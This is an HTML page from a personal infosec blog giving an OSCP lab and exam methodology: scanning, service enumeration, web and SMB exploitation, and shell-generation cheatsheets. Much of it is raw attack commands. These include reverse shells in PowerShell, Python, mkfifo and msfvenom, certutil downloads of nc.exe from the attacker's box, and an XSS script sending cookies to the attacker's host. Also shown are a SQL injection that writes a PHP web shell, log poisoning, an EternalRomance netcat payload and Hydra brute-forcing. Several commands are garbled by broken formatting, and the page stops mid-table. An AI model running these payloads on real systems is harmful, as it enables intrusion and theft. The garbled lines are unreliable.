<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - OSCP Methodology</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - Personal notes on learning infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
  </head>
  <body>

    <header>
      <section>
        <a href="/chasm/">
          <img
            class="logo"
            src="/assets/images/chasm.jpg"
            alt="chasm logo"
          />
        </a>
        <h2><a href="/chasm/">chasm</a></h2>
      </section>
      <nav>
        <a href="/">Home</a>
        <a href="/chasm/about/">About</a>
      </nav>
    </header>
    <main>

    <main>
        <h2>Oscp methodology</h2>
      <h1>Introduction</h1>

<p><strong>About</strong> <br>
The checklist aim to assist OSCP students with a baseline methodology for the labs and exam environments. </p>

<p><strong>Checks</strong></p>

<p>[ ] Scanning<br>
[ ] Enumeration<br>
[ ] Exploitation<br>
[ ] Privilege Escalation<br>
[ ] Flags<br>
[ ] Post Exploitation</p>

<h1>Quick Command Cheatsheet</h1>

<table><thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td>Lsof -IKill -9 <strong>PID</strong></td>
<td><em>Kill a specific service that you don’t use anymore.</em></td>
</tr>
<tr>
<td>rdesktop -g 90%  <strong>$IP</strong></td>
<td><em>Remote desktop with screen area set to 90%.</em></td>
</tr>
<tr>
<td>python -m SimpleHTTPServer 8000certutil.exe -urlcache -split -f <a href="http://10.11.0.105:8000/Taihou32.exe" rel="nofollow">http://10.11.0.105:80/EX.exe</a>certutil.exe -urlcache -split -f <a href="http://10.11.0.105:8000/ipsec.sh" rel="nofollow">http://10.11.0.105:8000/ipsec.sh</a> accesschk.txt certutil.exe -urlcache -split -f <a href="http://10.11.0.105:8000/icacls.exe" rel="nofollow">http://10.11.0.105:8000/icacls.exe</a> icacls.exe certutil.exe -urlcache -split -f <a href="http://10.11.0.105:8000/nc.exe" rel="nofollow">http://10.11.0.105:8000/nc.exe</a> nc.exe</td>
<td><em>Transfer files using Certutil.  This has been my rock during the OSCP challenge. Host a webserver on your box, I’ve used python webserver.</em><em>(<a href="http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html" rel="nofollow">http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html</a>)</em></td>
</tr>
<tr>
<td>msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.105 LPORT=3333 -f asp &gt; wireshell.asp<strong>Within metasploit:</strong>use exploit/multi/handlerset payload sho/x86/shell/reverse_tcp  set lhost 10.11.0.105set lport 3333</td>
<td><em>Multi/Handler example. Allowed during the exam.</em></td>
</tr>
<tr>
<td>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.XX.XX&quot;,77);$stream = $client.GetStream();[byte[]]$bytes = 0..65535</td>
<td>%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1</td>
</tr>
<tr>
<td><strong>Create cookie.js file.</strong> filevar img = document.createElement (“img”);img.src = “<a href="http://youipaddress/ddos?%E2%80%9D" rel="nofollow">http://youipaddress/ddos?”</a> + escape(document.cookie);document.body.appendChild(img);<strong>Copy to webserver and inject.</strong>&#39;&quot;&gt;&gt;</td>
<td><em>Stealing cookies using XSS.</em></td>
</tr>
</tbody></table>

<h1>Non OSCP machines</h1>

<p>Some CTF machines you can practice on before taking the OSCP challenge.</p>

<ul>
<li>Kioptrix: Level 1 </li>
<li>Kioptrix: Level 1.1 </li>
<li>Kioptrix: Level 1.2 </li>
<li>Kioptrix: Level 1.3 </li>
<li>FristiLeaks: 1.3 </li>
<li>Stapler: 1 </li>
<li>PwnLab: init </li>
<li>Pluck: 1 </li>
<li>W1R3S: 1.0.1 </li>
<li>Kioptrix: 2014 </li>
<li>Brainpan: 1 (Part 1 of BO is relevant to OSCP only)</li>
<li>Mr-Robot: 1 </li>
<li>HackLAB: Vulnix </li>
<li>VulnOS: 2 </li>
<li>SickOs: 1.2 </li>
<li>/dev/random: scream</li>
<li>pWnOS: 2.0</li>
<li>SkyTower: 1</li>
<li>IMF</li>
<li>Lord of the Root 1.0.1 </li>
<li>Tr0ll</li>
<li>Pegasus</li>
<li>SkyTower </li>
<li>Metasploitable 3</li>
<li><p>Devel, Optimum, Bastard, Grandpa and Blue from Hack The Box.</p>

<h1>Scanning</h1>

<p>[ ] TCP<br>
[ ] UDP<br>
[ ] Other</p>

<p><strong>TCP</strong><br>
| <strong>Command</strong>                                                                                                                                     | <strong>Description</strong>                                                                                  |<br>
| ----------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |<br>
| nmap -Pn -v -sS -A -T4 <strong>XXIPXXX</strong>                                                                                                              | <em>Run standard nmap scan with services and timing set.</em>                                           |<br>
| nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oA <strong>/root/Documents/XXXX</strong> <strong>XXIPXXX</strong> | <em>Run full nmap scan for all ports and save results in folder. Note this scan is time consuming.</em> |</p>

<p><strong>UDP</strong><br>
| <strong>Command</strong>                                                                                                  | <strong>Description</strong>                                               |<br>
| ------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------- |<br>
| nmap -sU -sV -p- <strong>XXIPXXX</strong>                                                                                 | <em>Run standard nmap UDP scan with services detection.</em>         |<br>
| nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oA  <strong>/root/Documents/XXXX</strong> <strong>XXIPXXX</strong> | <em>Run nmap UDP scan for top ports and save results in folder.</em> |</p>

<p><strong>Other</strong><br>
| <strong>Command</strong>                                                                                                                                                                   | <strong>Description</strong>                                                                                                              |<br>
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |<br>
| #!/bin/bashi=&quot;0&quot;while [ $i -lt &quot;255&quot; ]do nslookup <strong>10.11.1.$i</strong> <strong>10.11.1.XX</strong> | grep -v &quot;NXDOMAIN&quot; | grep name | cut -f1,3 -d&quot; &quot;        i=$[ $i+1 ]done | <em>Enumerate all hostnames within a domain using DNS. Helpful to identify each PC name and their IP address within a network.</em> |</p></li>
</ul>

<h1>Enumeration</h1>

<p>[ ] 21 - FTP<br>
[ ] 80/8080 - HTTP/S<br>
[ ] 22 - SSH<br>
[ ] 445/139/135 - SMB <br>
[ ] 161 - SNMP<br>
[ ] 3306 - MySQL<br>
[ ] 1560 - ORACLE<br>
[ ] 111/139/334 - RPC<br>
[ ] Hausec checklist</p>

<h2>21 - FTP</h2>

<table><thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td>nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 <strong>$IP</strong></td>
<td><em>Enumerate FTP using Nmap.</em></td>
</tr>
<tr>
<td>FileZilla or Telnet</td>
<td><em>Browse and try to connect using anonymous login e.g. User: Anonymous Pass: ano@</em></td>
</tr>
</tbody></table>

<h2>80/8080 - HTTP/S</h2>

<p>Web application hacking is crucial to the OSCP challenge and the short cheatsheet should be able to assist with identifying the most common vulnerabilities. It is important to note that understanding the application/functions within the web application is paramount to success. Use the source viewer, BURP/ZAP to understand how information flows. Identify plugin versions/code versions and look for vulnerabilities. Always revert back to the core of the function, how does it work and operate.</p>

<table><thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td>Firefox - View source / BURP Suite or ZAP Proxy</td>
<td><em>Carefully observe the source code to understand the web application. Take down every possible version number and check for vulnerabilities. Look at HTTP response headers</em><em>Google error messages, cookie names, version headers, password hashes</em></td>
</tr>
<tr>
<td><strong>Input the following at inputs to quick fuzz the application:</strong>&#39;xsstest../../../../../../../../../../etc/passwd....................\boot.ini))))))))))</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td><strong>php.ini values:</strong>register_globalsallow_urlallow_url_fopenallow_url_include</td>
<td><em>Inspect the source code to identify LFI or RFI vulnerabilities. Does the php.ini include any of the mentioned values?</em> ***<em>[*<a href="http://www.hackingarticles.in/beginner-guide-file-inclusion-attack-lfirfi/" rel="nofollow">http://www.hackingarticles.in/beginner-guide-file-inclusion-attack-lfirfi/</a></em>](<a href="http://www.hackingarticles.in/beginner-guide-file-inclusion-attack-lfirfi/" rel="nofollow">http://www.hackingarticles.in/beginner-guide-file-inclusion-attack-lfirfi/</a>)</td>
</tr>
<tr>
<td>nmap –p 443 --script ssl-heartbleed <strong>XXIPXXX</strong></td>
<td><em>Check for heartbleed vulnerability.</em></td>
</tr>
<tr>
<td>gobuster -s &quot;200,204,301,302,307,403,500&quot; -w /usr/share/seclists/Discovery/Web_Content/common.txt -u <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX</strong></td>
<td><em>Fuzz URLs with gobuster</em></td>
</tr>
<tr>
<td>gobuster -s &quot;200,204,301,302,307,403,500&quot;  -u <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX</strong> -w [LIST]</td>
<td><em>More fuzzing with gobuster based on output from first command (e.g IIS specific, cgi-bin, etc?)</em>**<em>[LIST]</em><em>/root/Documents/SecLists-master/Discovery/Web-Content/iis.txt</em><em>/root/Documents/SecLists-master/Discovery/Web-Content/nginx.txt</em><em>/root/Documents/SecLists-master/Discovery/Web-Content/apache.txt</em></td>
</tr>
<tr>
<td>parsero -u <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX</strong></td>
<td><em>Use parsero to check robots.txt</em></td>
</tr>
<tr>
<td>nikto -h  <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX</strong></td>
<td><em>Run Nikto to discover low hanging vulnerabilities within the web application.</em></td>
</tr>
<tr>
<td>kadimus -u <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX</strong><a href="https://$ip/section.php?page=" rel="nofollow"><strong>/section.php?page=</strong></a></td>
<td><em>Kadimus is a tool to check sites to lfi vulnerability , and also exploit it.</em>**<em>(<a href="https://github.com/P0cL4bs/Kadimus" rel="nofollow">https://github.com/P0cL4bs/Kadimus</a>)</em></td>
</tr>
<tr>
<td>curl -i -X OPTIONS <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX</strong>curl -X PUT -T &quot;/path/to/file&quot; &quot;<a href="http://myputserver.com/puturl.tmp" rel="nofollow">http://myputserver.com/puturl.tmp</a>&quot; curl -X MOVE --header  &quot;Destination:<a href="http://10.11.1.13/asp.asp" rel="nofollow">http://10.11.1.13/asp.asp</a>&quot; &quot;<a href="http://10.11.1.13/asp.txt" rel="nofollow">http://10.11.1.13/asp.txt</a>&quot;</td>
<td><em>Observe if the website allows PUT/COPY/MOVE requests. This can be manipulated to upload remote shells. The MOVE function can be used to bypass upload restrictions.</em><em>(<a href="https://sushant747.gitbooks.io/total-oscp-guide/bypass_image_upload.html" rel="nofollow">https://sushant747.gitbooks.io/total-oscp-guide/bypass_image_upload.html</a>)</em></td>
</tr>
<tr>
<td>curl -i <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX</strong></td>
<td><em>Inspect the header using curl.</em></td>
</tr>
<tr>
<td>nmap --script http-iis-webdav-scan -p80 <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX</strong>nmap --script http-iis-webdav-vuln -p80 <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX</strong>davtest -url <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX</strong>cadaver <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX/[davpath]</strong> <em>use copy with ;.txt to bypass restrictions</em></td>
<td><em>If WEBDAV is enabled (IIS server usually) then you could potentially upload a remote shell.</em></td>
</tr>
<tr>
<td>cewl <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX</strong> -m 3 -w words.txt</td>
<td><em>Scrape the website using cewl. Current commant runs cewl and set the minimum characters to 3 using (-m). Once completed use to bruteforce passwords or run with gobuster.</em></td>
</tr>
<tr>
<td>hydra <a href="http://10.11.1.229" rel="nofollow"><strong>http://</strong></a><strong>XXXX</strong> http-form-post &quot;/TARGETPATH/TARGETPAGE.php:user=<sup>USER<sup>&amp;pass=<sup>PASS<sup>:Bad</sup></sup></sup></sup> login&quot; -L users.txt -P pass.txt- <em>1st field (before the 1st colon) = location of the target page</em>- <em>2nd field (before the 2nd colon) = user &amp; password parameters</em>- <em>3rd field (after the 2nd colon) = page response on incorrect login attempt</em></td>
<td><em>Bruteforce a website login using the Hydra tool.</em></td>
</tr>
<tr>
<td><strong>Command injection shortcuts:</strong>“url -s --data &quot;&lt;?system(&#39;ls -la&#39;);?&gt;&quot; &quot;<a href="http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00" rel="nofollow"><strong>http://XXXXX/admin.php?IN_path=php://input%00</strong></a>&quot; curl -s --data &quot;&lt;?system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f</td>
<td>/bin/sh -i 2&gt;&amp;1</td>
</tr>
<tr>
<td><strong>LFI Series 1:</strong>gobuster -w SecLists-5c9217fe8e930c41d128aacdc68cbce7ece96e4f/Fuzzing/LFI-JHADDIX.txt -u <a href="http://testphp.vulnweb.com/artists.php?artist=" rel="nofollow"><strong>http://testphp.vulnweb.com/artists.php?artist=</strong></a></td>
<td><em>A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time. Therefore it is critical to be able to pivot from a LFI vulnerability.</em><a href="https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/" rel="nofollow">https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/</a>****<em>Make use of the LFI-JHADDIX fuzz list available at: <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI-JHADDIX.txt" rel="nofollow">https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI-JHADDIX.txt</a></em></td>
</tr>
<tr>
<td><strong>LFI Series 2:</strong><strong>Linux:</strong>/etc/passwd/var/log/mail/USER/var/log/apache2/access.log/proc/self/environ/var/log/auth.log**** **** <strong>Windows:</strong>%SYSTEMDRIVE%\boot.ini unattend.txt, unattend.xml, unattended.xml, sysprep.inf from %WINDIR%\Panther&lt;br&gt;%SYSTEMDRIVE%\autoexec.bat</td>
<td><em>Once a vulnerability is identified try to access the following files. Further refer to:</em><a href="http://pwnwiki.io/#!presence/windows/blind.md" rel="nofollow"><em>http://pwnwiki.io/#!presence/windows/blind.md</em></a><strong><em><a href="https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html" rel="nofollow">https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html</a></em><a href="https://xapax.gitbooks.io/security/content/local_file_inclusion.html" rel="nofollow"><em>https://xapax.gitbooks.io/security/content/local_file_inclusion.html</em></a></strong><a href="https://highon.coffee/blog/lfi-cheat-sheet/" rel="nofollow"><em>https://highon.coffee/blog/lfi-cheat-sheet/</em></a>**</td>
</tr>
<tr>
<td><strong>LFI - Log File Contamination</strong>1. nv -nv $ip 80 &lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;2. cmd= <em>is introduced into the php execution and now by including the logfile you can execute any command</em></td>
<td><em>If you can LFI to the log file, you might be able to contaminate it.</em><em><a href="https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/" rel="nofollow">https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/</a></em></td>
</tr>
<tr>
<td><strong>Look for config files if:</strong>- Mambo- Joomla- Wordpress- JBOSS</td>
<td><em>Refer to this guide:</em><a href="https://guif.re/webtesting" rel="nofollow"><em>https://guif.re/webtesting</em></a></td>
</tr>
<tr>
<td><strong>SQL Injection:</strong><a href="https://ip/index.php?page=job.php&job=-1" rel="nofollow">https://ip/index.php?page=job.php&amp;job=-1)union</a>union) select user() -- +<a href="https://ip/index.php?page=job.php&job=-1" rel="nofollow">https://ip//index.php?page=job.php&amp;job=-1</a>) union select all &quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);php?&gt;&quot; into outfile &#39;/usr/local/nginx/html/shell.php&#39; -- +<a href="https://ip/shell.php?cmd=python" rel="nofollow">https://ip//shell.php?cmd=python</a> -c &#39;importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.23.31&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;<a href="http://testphp.vulnweb.com/artists.php?artist=1%E2%80%99" rel="nofollow">http://testphp.vulnweb.com/artists.php?artist=1’</a>  #also try double quote (&quot;&quot;) or a semicolon (;)<a href="http://testphp.vulnweb.com/artists.php?artist=1" rel="nofollow">http://testphp.vulnweb.com/artists.php?artist=1</a> order by 1 #2,3,4,5…..<a href="http://testphp.vulnweb.com/artists.php?artist=1" rel="nofollow">http://testphp.vulnweb.com/artists.php?artist=1</a> union select 1,2,3<a href="http://testphp.vulnweb.com/artists.php?artist=-1" rel="nofollow">http://testphp.vulnweb.com/artists.php?artist=-1</a> union select 1,database(),3<a href="http://testphp.vulnweb.com/artists.php?artist=-1" rel="nofollow">http://testphp.vulnweb.com/artists.php?artist=-1</a> union select 1,version(),current_user()<a href="http://testphp.vulnweb.com/artists.php?artist=-1" rel="nofollow">http://testphp.vulnweb.com/artists.php?artist=-1</a> union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1<a href="http://testphp.vulnweb.com/artists.php?artist=-1" rel="nofollow">http://testphp.vulnweb.com/artists.php?artist=-1</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()<a href="http://testphp.vulnweb.com/artists.php?artist=-1" rel="nofollow">http://testphp.vulnweb.com/artists.php?artist=-1</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;<a href="http://testphp.vulnweb.com/artists.php?artist=-1" rel="nofollow">http://testphp.vulnweb.com/artists.php?artist=-1</a> union select 1,group_concat(uname),3 from users<a href="http://www.example.com/news.asp?id=2" rel="nofollow">http://www.example.com/news.asp?id=2</a>&#39; or &#39;1&#39;=&#39;1    +-----------------------------+</td>
<td>&#39; or 1=1 --</td>
</tr>
<tr>
<td><a href="https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/" rel="nofollow">https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/</a></td>
<td><em>If you have not identified anything in the web application, enumerate other ports again. If you feel confident that the web application is the only entry point refer to the attached guide.</em></td>
</tr>
</tbody></table>

<h2>22 - SSH</h2>

<p>| <strong>Command</strong>                                                                                                                                                                                                 | <strong>Description</strong>                                                                                               |  |<br>
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------- |  |<br>
| nc <strong>$IP</strong> 22telnet <strong>$IP</strong> 22                                                                                                                                                                          | <em>Use nc and telnet to connect.</em>                                                                               |  |<br>
| hydra -f -V -t 1 -C /usr/share/SecLists-5c9217fe8e930c41d128aacdc68cbce7ece96e4f/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 22 <strong>$IP</strong> ssh                                              | <em>Brute force for common username and passwords.</em>                                                              |  |<br>
| nmap -sV -sC <strong>$IP</strong>                                                                                                                                                                                        | <em>Check the SSH version to see if it is vulnerable to any exploits.</em>                                           |  |<br>
| nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi <strong>$IP</strong>curl -H &#39;User-Agent: () { :; }; echo &quot;CVE-2014-6271 vulnerable&quot; bash -c id&#39; <a href="http://10.xx.1.xx/cgi-bin/admin.cgi" rel="nofollow">http://10.xx.1.xx/cgi-bin/admin.cgi</a> | <em>Shellshock?</em><em>Attacks vector:</em>- <em>HTTP (CGI pages)</em>- <em>SSH (require auth)</em>- <em>DHCP (server)</em> |  |<br>
| Tunnelling or Port forwarding<a href="https://github.com/itsKindred/PortPush" rel="nofollow">https://github.com/itsKindred/PortPush</a>                                                                                                                                     |                                                                                                               |  |</p>

<h2>445/139/135 - SMB</h2>

<table><thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td>perl &#39;/root/smbenum/trans2root.pl&#39; -t linx86 -H <strong>$IP</strong> -h <strong>$IP</strong></td>
<td><em>Port 139?</em><em>Use trans2open (source</em> <a href="https://www.exploit-db.com/exploits/10/" rel="nofollow"><em>https://www.exploit-db.com/exploits/10/</em></a><em>)</em></td>
</tr>
<tr>
<td>nmap -p445 --script smb-protocols <strong>$IP</strong>nmap -p445 --script smb-vuln-ms17-010 <strong>$IP</strong>python woraMS17-010.py <strong>$IP</strong></td>
<td><em>Eternal Blue vulnerability?</em><em>Check the SMB version (must be v1).</em><em>Check if the patch is missing.</em><em>Exploit using <a href="https://github.com/worawit/MS17-010" rel="nofollow">https://github.com/worawit/MS17-010</a></em></td>
</tr>
<tr>
<td>nmap <strong>$IP</strong> -sV -Pn -vv -p 139,445 --script=smb-vuln* --script-args=unsafe=1</td>
<td><em>Nmap SMB scripts (get as much info from these as you can)</em></td>
</tr>
<tr>
<td>nmblookup -A <strong>$IP</strong> enum4linux -a <strong>$IP</strong> rpcclient -U &quot;&quot; <strong>$IP</strong>- srvinfo- enumdomusers- getdompwinfo- querydominfo- netshareenum- netshareenumall smbclient -L <strong>$IP</strong>smbclient //<strong>$IP</strong>/tmpsmbclient [\\](file://$ip/ipc$)<strong>$IP</strong><a href="file://$ip/ipc$" rel="nofollow">\ipc$</a> -U johnsmbclient //<strong>$IP</strong>/ipc$ -U johnsmbclient //<strong>$IP</strong>/admin$ -U john <strong>Log in with shell:</strong>winexe -U username //<strong>$IP</strong> &quot;cmd.exe&quot; --system</td>
<td><em>Connect and enumerate shares (get as much info from these as you can)</em>**<em>Look specifically for access to home folders with .ssh credentials.</em><em>Look for access to upload reverse shells.</em></td>
</tr>
<tr>
<td>smbclient ‘[\](file://$ip/share&#39;)<strong>$IP</strong><a href="file://$ip/share&#x27;" rel="nofollow">\share&#39;</a>put nc.exepython eternalromance.py <strong>$IP</strong> &quot;&quot; &quot;&quot; “c:\share\nc -nv $my_ip 4445 -e cmd.exe”</td>
<td><em>Windows vulnerable to Eternalromance exploit?</em></td>
</tr>
<tr>
<td>nmap <strong>$IP</strong> --script=msrpc-enum</td>
<td><em>Vulnerable to exploit/windows/dcerpc/ms03_026_dcom ?</em></td>
</tr>
</tbody></table>

<h2>161 - SNMP</h2>

<table><thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td>snmpwalk -c public -v1 <strong>$IP</strong>snmp-check <strong>$IP</strong>snmpcheck -t <strong>$IP</strong> -c publicperl snmpenum.pl <strong>$IP</strong> public windows.txt<strong>Common community strings:</strong>- public- private- community</td>
<td><em>SNMP Enumeration. I’ve mostly used snmp check.</em></td>
</tr>
<tr>
<td>nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes <strong>$IP</strong></td>
<td><em>Nmap SNMP checks.</em></td>
</tr>
<tr>
<td>nmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse <strong>$IP</strong></td>
<td><em>Enumerate windows users via SNMP.</em></td>
</tr>
</tbody></table>

<h2>3306 - MySQL</h2>

<table><thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td>nmap -sV -Pn -vv  <strong>$IP</strong> -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122</td>
<td><em>Nmap enumeration for MySQL.</em></td>
</tr>
<tr>
<td><a href="https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/" rel="nofollow">https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/</a></td>
<td><em>Brilliant guide is here. Too long to post.</em></td>
</tr>
</tbody></table>

<h2>1521/1560 - ORACLE</h2>

<table><thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td>tnscmd10g version -h <strong>$IP</strong></td>
<td><em>E</em><em>numerate oracle TNS.</em></td>
</tr>
<tr>
<td>nmap --script=oracle-sid-brute  <strong>$IP</strong> nmap --script=oracle-brute  <strong>$IP</strong></td>
<td><em>Brute force user accounts and SID.</em><em>Check for default credentials.</em><em>(<a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/wordlists-user-passwd/oracle" rel="nofollow">https://github.com/fuzzdb-project/fuzzdb/tree/master/wordlists-user-passwd/oracle</a>)</em></td>
</tr>
</tbody></table>

<h2>111/139/334 - RPC</h2>

<table><thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td>rpcinfo –p <strong>$IP</strong></td>
<td><em>Output RPC information.</em><em><a href="http://www.tutorialspoint.com/unix_commands/rpcinfo.htm" rel="nofollow">http://www.tutorialspoint.com/unix_commands/rpcinfo.htm</a></em></td>
</tr>
<tr>
<td>enum4linux –a <strong>$IP</strong></td>
<td><em>Alternative to enum.exe. Brilliant tool. Look for open ports you can’t see with nmap. Look for specific vulnerable services or default users.</em></td>
</tr>
</tbody></table>

<h2>Hausec checklist</h2>

<table><thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td><a href="https://hausec.com/pentesting-cheatsheet/#_Toc475368980" rel="nofollow">https://hausec.com/pentesting-cheatsheet/#_Toc475368980</a></td>
<td><em>Follow the checklist for enumeration if the above fails.</em></td>
</tr>
</tbody></table>

<h1>Exploitation</h1>

<p>If you’ve performed proper enumeration you should be able to find exploits using searchsploit and exploitdb. </p>

<p>If you have modified an exploit, you should include:</p>

<ul>
<li>The modified exploit code</li>
<li>The URL to the original exploit code</li>
<li>The command used to generate any shellcode (if applicable)</li>
<li>Highlighted changes you have made</li>
<li>An explanation of why those changes were made</li>
</ul>

<p>I have provided a template I use for exploits during the exam and labs.</p>

<table><thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td><a href="https://superuser-ltd.github.io/2017/msfvenom-payloads/" rel="nofollow">https://superuser-ltd.github.io/2017/msfvenom-payloads/</a></td>
<td><em>A list of MSFVenom one-liners are provided here.</em></td>
</tr>
<tr>
<td>msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.103 lport=1111 R</td>
<td><em>Compile shell.</em></td>
</tr>
<tr>
<td>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp</td>
<td><em>Compile shell.</em></td>
</tr>
<tr>
<td>msfvenom -p php/reverse_php LHOST=(IP Address) LPORT=4445 -f raw &gt; shell.php</td>
<td><em>Compile shell.</em></td>
</tr>
<tr>
<td>msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.103 lport=2222 R</td>
<td><em>Compile shell.</em></td>
</tr>
<tr>
<td>msfvenom -p windows/shell_reverse_tcp -a x86 -f python --platform windows LHOST= LPORT=443 -b &quot;\x00&quot; EXITFUNC=thread --smallest -e x86/fnstenv_mov</td>
<td><em>Compile shell.</em></td>
</tr>
<tr>
<td>gcc -m32 -Wl,--hash-style=both 9542.c -o 9542</td>
<td><em>Compile an exploit for older version.</em></td>
</tr>
<tr>
<td><a href="https://www.packtpub.com/mapt/book/networking_and_servers/9781786463166/9/ch09lvl1sec62/using-autorunscript-in-metasploit" rel="nofollow">https://www.packtpub.com/mapt/book/networking_and_servers/9781786463166/9/ch09lvl1sec62/using-autorunscript-in-metasploit</a></td>
<td><em>If script does not run long enough use Autorunscript to migrate to another process first. Default exit options of scripts are also important.</em></td>
</tr>
<tr>
<td><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" rel="nofollow">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells" rel="nofollow">https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells</a></td>
<td><em>Good outline on upgrading your shell to full TTYS.</em></td>
</tr>
</tbody></table>

<h2>Exploit Template</h2>

<p>| Exploit used                    |  |<br>
| ------------------------------- |  |<br>
| Source                          |  |<br>
| Modifications required          |  |<br>
| Steps to obtain low level shell |  |</p>

<h1>Privilege Escalation</h1>

<p>The below guides will assist you in performing privilege escalation. Always note that you need to follow the template for exploit if you use any exploit. Train yourself in the habit of documenting your steps. </p>

<h2>Linux</h2>

<table><thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
